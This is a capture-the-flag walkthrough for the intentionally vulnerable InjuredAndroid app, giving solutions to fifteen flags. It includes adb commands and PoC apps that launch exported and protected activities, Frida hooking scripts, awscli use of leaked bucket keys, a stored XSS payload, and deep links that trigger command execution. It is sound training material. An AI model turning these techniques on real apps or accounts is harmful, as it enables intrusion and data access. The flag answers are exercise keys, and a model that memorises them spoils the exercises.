## InjuredAndroid walk-throughs

### Flag 1 - F1ag_0n3

1. Review source code and find the comparison string.

```java
if (post.equals("F1ag_0n3")) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagOneButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagOneButtonColor", true).commit();
            startActivity(intent);
        }
```

2. Submit the comparison string to score.

---

### Flag 2 - S3cond_F1ag

1. Invoke exported activity with adb or PoC app. (PoC app will help with later exercises)

```bash
adb shell am start -n b3nac.injuredandroid/.b25lActivity

```

```java
package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.b25lActivity");
        startActivity(next);
    }

}

```

This flag is intended to introduce how starting exported activities work.

---

### Flag 3 - F1ag_thr33

1. Source code review based exercise. Trace resource reference to strings.xml.

```java

if (post.equals(getString(R.string.cmVzb3VyY2VzX3lv))) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagThreeButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagThreeButtonColor", true).commit();
            startActivity(intent);
        }

```

2. In strings.xml search for R.string.cmVzb3VyY2VzX3lv. 

`<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>`

3. Submit the value as the flag.

---

### Flag 4 - 4_overdone_omelets

1. Find where the bob variable is located.

```java

String bob = new String(decoder.getData());

if (post.equals(bob)) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagFourButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFourButtonColor", true).commit();
            startActivity(intent);
        }

```

2. Search the Decoder class for the base64 string and decode it or hook the method with frida.

```java

public class Decoder {
    byte [] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", Base64.DEFAULT);

    public byte[] getData() {
        return data;
    }
}

```

3. Submit the Base64 decoded value.

---

### Flag 5 - {F1V3!}

1. Iterate the broadcast by revisiting activity. 

2. After visiting the FlagFiveActivity three times the flag will be broadcasted.


```java

if (wtf == 0) {
            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + intent.getAction() + "\n");
            sb.append("URI: " + intent.toUri(Intent.URI_INTENT_SCHEME) + "\n");
            String log = sb.toString();
            Log.d("DUDE!:", log);
            Toast.makeText(context, log, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 1) {
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 2) {

            String win = "You are a winner " + VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ=");
            FlagsOverview.flagFiveButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFiveButtonColor", true).commit();
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            
        }else{
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
        }

```

---

### Flag 6 - {This_Isn't_Where_I_Parked_My_Car}

1. Use frida to hook the decryption method for the flag.

Python file "test.py" for Frida:

```python

import time
import frida

device = frida.get_usb_device()
pid = device.spawn(["b3nac.injuredandroid"])
device.resume(pid)
time.sleep(1)  # Without it Java.perform silently fails
session = device.attach(pid)
with open("test.js") as f:
    script = session.create_script(f.read())
script.load()

# prevent the python script from terminating
input()

```

Javascript file that is imported with python for Frida:

```javascript

console.log("Script loaded successfully ");
Java.perform(function x() {
    console.log("Inside java perform function");
    var my_class = Java.use("b3nac.injuredandroid.VGV4dEVuY3J5cHRpb25Ud28");
    
    var string_class = Java.use("java.lang.String");

    my_class.decrypt.overload("java.lang.String").implementation = function (x) { //hooking the new function
        console.log("*************************************")
        var my_string = string_class.$new("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
        console.log("Original arg: " + x);
        var ret = this.decrypt(my_string);
        console.log("Return value: " + ret);
        console.log("*************************************")
        return ret;
    };
    Java.choose("b3nac.injuredandroid", {
        onMatch: function (instance) {
            console.log("Found instance: " + instance);
            console.log("Result of secret func: " + instance.decrypt());
        },
        onComplete: function () { }

    });

});


```
---

### Flag 7 - S3V3N_11

1. Find the flag password in the sqlite database.  

2. Flag password first found as a MD5 hash `2ab96390c7dbe3439de74d0c9b0b1767` crack this value to get `hunter2`.

3. The flag url is in the Hide class rot47 encoded: https://injuredandroid.firebaseio.com/sqlite.json 

```java

private static String remoteUrl = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?";

```

3. Enter both into the submit flag form for completion.

---

### Flag 8 - C10ud_S3cur1ty_lol

1. Find the AWS bucket information in strings.xml and use disclosed aws id and aws secret to access s3 bucket with awscli.

2. Create AWS profile in `~/.aws/credentials`:

```bash

[injuredandroid]
aws_access_key_id = lookinstrings.xmlnotputtingitheresoawsdoesn'talert
aws_secret_access_key = lookinstrings.xmlnotputtingitheresoawsdoesn'talert


```

3. Use this awscli command to capture the flag.

```bash

aws s3 ls s3://injuredandroid --profile injuredandroid

```

---

### Flag 9 - [nine!_flag]

1. Find the flag by navigating to the firebase endpoint: `https://injuredandroid.firebaseio.com/flags.json`

```java

public class FlagNineFirebaseActivity extends AppCompatActivity {
    int click = 0;
    private static final String TAG = "FirebaseActivity";
    final String directory = "ZmxhZ3Mv";
    byte[] decodedDirectory = Base64.decode(directory, Base64.DEFAULT);
    final String refDirectory = new String(decodedDirectory, StandardCharsets.UTF_8);

```

2. Base64 decode the directory value: `final String directory = "ZmxhZ3Mv";`

3. Which gives you `flags/` which correlates to the endpoint being `flags.json` 

4. Base64 encode the flag from the response of `https://injuredandroid.firebaseio.com/flags.json` to score: `W25pbmUhX2ZsYWdd`

---

### Flag 10 - John@Gıthub.com

1. Research "Github dotless i". 

The method toUpperCase works in Kotlin as well as Java for the unicode collision. 

```kotlin
val value = dataSnapshot.value as String?
                        when {
                            post == value -> Toast.makeText(this@FlagTenUnicodeActivity, "No cheating. :]",
                                    Toast.LENGTH_SHORT).show()
                            post.toUpperCase(Locale.ROOT) == value!!.toUpperCase(Locale.ROOT) -> correctFlag()
                            else -> Toast.makeText(this@FlagTenUnicodeActivity, "Try again! :D",
                                    Toast.LENGTH_SHORT).show()
                        }

```

From the exercise code above we can see that `post.toUpperCase(Locale.ROOT) == value!!.toUpperCase(Locale.ROOT) -> correctFlag()` is converting the dotless ı to a normal i.

2. Authenticate using the `b3nac.injuredandroid.QXV0aA` activity by using an adb command to start the activity.

```bash
adb shell am start -n b3nac.injuredandroid/.QXV0aA

```

3. Submit email with dotless i after authenticating.

---

### Flag 11 - HIIMASTRING

1. First invoke the activity with a deep link so you can access the post form. 

`adb shell am start -W -a android.intent.action.VIEW -d "flag11://"`

2. Secondly find the binary in the apk and run strings on the golang binary or run the binary and the Golang binary will print the flag. 

3. Binary location is: `res/values/meŉu`

---

### Flag 12 - Flag complete after using a PoC apk

1. Complete the exploit by using a PoC app, an example from my Youtube video.

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent next = new Intent();
        next.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity");
        next.putExtra("totally_secure", "https://google.com");

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent");
        start.putExtra("access_protected_component", next);

        startActivity(start);
    }

}

```

---

### Flag 13 - Treasure_Planet

#### Non-rooted device

1. Run adb as root (Google apis are needed with VM)

`adb root`

2. Use adb shell to access phone file directories

`adb shell`

3. Navigate to `/data/data/b3nac.injuredandroid/files`.

4. chmod the binary that matches your phone architecture.

`chmod +x binaryname`

5. Now use deep links to display binary command results in the Activity WebView. The flag is split into three separate commands.

```html
<html>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testOne">Test one!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testTwo">Test two!</p>
<p><a href="flag13://rce?binary=narnia.x86_64&param=testThree">Test three!</p>
<p><a href="flag13://rce?combined=Treasure_Planet">OH SNAP!</p>
</html>
```

#### Rooted device

I believe you shouldn't have to chmod the binary with a rooted device.

1. Skip to using deep links to solve the flag.

---

### Flag 14 - Flutter Stored XSS

Solving this flag only requires finding the right javascript function for XSS.

```dart
if (widget.test == "onclick=alert(1)") {
```

1. At the login screen enter `onclick=alert(1)` and login.

2. Navigate to the user profile page and the XSS will fire because It's stored as the username while also solving the flag.

---

### Flag 15 - WIN

1. The initial Activity will have a byte array `[58,40,42]` that requires the key to XOR back to the original flag string.

2. Decompile the flutter.so files to find the XOR key and use a programming language of your choice to convert the byte array to a string then XOR the string with the key to find the flag.

```python
#!/usr/bin/env python
# encoding: utf-8

def encryptDecrypt(input):
    key = ['M', 'A', 'D']
    output = []
    
    for i in range(len(input)):
        xor_num = ord(input[i]) ^ ord(key[i % len(key)])
        output.append(chr(xor_num))
    
    return ''.join(output)


def main():
    encrypted = encryptDecrypt(":(*");
    print("Encrypted:" + encrypted);
    
    decrypted = encryptDecrypt(encrypted);
    print("Decrypted:" + decrypted);
    data = [58,40,42]
    dataConverted = "".join( chr(x) for x in data)
    print(dataConverted)
    pass

if __name__ == '__main__':
    main()
```